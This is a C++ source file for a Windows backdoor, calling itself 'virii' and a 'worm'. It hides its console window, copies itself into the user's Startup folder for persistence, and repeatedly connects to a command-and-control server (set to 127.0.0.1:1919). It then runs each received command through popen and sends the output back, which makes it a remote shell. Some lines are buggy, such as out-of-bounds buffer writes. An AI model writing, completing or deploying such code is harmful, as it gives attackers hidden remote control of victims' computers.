#include <cstdio>
#include <chrono>
#include <thread>
#include <string>
#include <cstdlib>
#include <fstream>
#include <unistd.h>
#include <tchar.h>
#include <locale.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <filesystem>
#define MAX 65536

class client{
private:
    /* cnc server ip address */
    const char *server_ip_addr = "127.0.0.1";
    int port_number;

    WSADATA wsa_data;
    HWND window;

    int dst_socket;

    char send_buf[MAX];
    char recv_buf[MAX];

    char t[MAX];

    char p_w_d[MAX];
public:
    client(): port_number(1919) {
        //FreeConsole();
        AllocConsole();
        window = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(window, 0);

        send_buf[MAX] = {};
        recv_buf[MAX] = {};
        t[MAX] = {};
    }

    void virii();
};

void client::virii() {
    if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0) {
        return;
    }

    struct sockaddr_in dst_addr;
    memset(&dst_addr, 0, sizeof(dst_addr));
    dst_addr.sin_port = htons(port_number);
    dst_addr.sin_family = AF_INET;

    inet_pton(dst_addr.sin_family, server_ip_addr, &dst_addr.sin_addr.s_addr);

    while (1) {
        dst_socket = socket(AF_INET, SOCK_STREAM, 0);

        if (connect(dst_socket, (struct sockaddr *) &dst_addr, sizeof(dst_addr))) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        while (1) {
            recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
            recv_buf[strcspn(recv_buf, "\r\n")] = 0;

            if (!strcmp(recv_buf, "!q")) break;
            
            if (!strncmp("cd", recv_buf, 2)) {
                for (size_t i = 0; i < strlen(recv_buf); i++) {
                    p_w_d[i] = recv_buf[i+3];
                }
                chdir(p_w_d);
            }
            else {
                FILE *fp;
                if ((fp = popen(recv_buf, "r")) == NULL) {
                    perror("can not exec commad");
                }
                while (!feof(fp)) {
                    strcat(t, send_buf);
                    fgets(send_buf, sizeof(send_buf), fp);
                }
                memcpy(send_buf, t, MAX);
                (void)pclose(fp);
            }

            send(dst_socket, send_buf, sizeof(send_buf), 0);
            memset(send_buf, 0, MAX*sizeof(send_buf[0]));
            memcpy(t, send_buf, MAX);
        }
    }

    closesocket(dst_socket);

    WSACleanup();
}

void start() {
    client* client_virii;
    client_virii = new client();

    client_virii->virii();
}

int main(int argc, char **argv) {
    client* client_virii;

    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;

    TCHAR user[1024];
    DWORD dwUserSize;

    char buf[256];
    strcpy(buf, argv[0]);
    std::string str = buf;
    if (str.find(".exe") == std::string::npos) {
        str += ".exe";
    }
    std::filesystem::path path = std::filesystem::current_path();
    std::string path_string{path.u8string() + "\\"};
    str.erase(str.find(path_string));
    std::string startup_directory = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string dir_place_worm = startup_directory + "\\" + str;
    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" " + dir_place_worm + "*\" /Y";
    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
    system(cmd_copy_worm_startup_p);

    std::thread th(start);
    th.join();

    return 0;
}
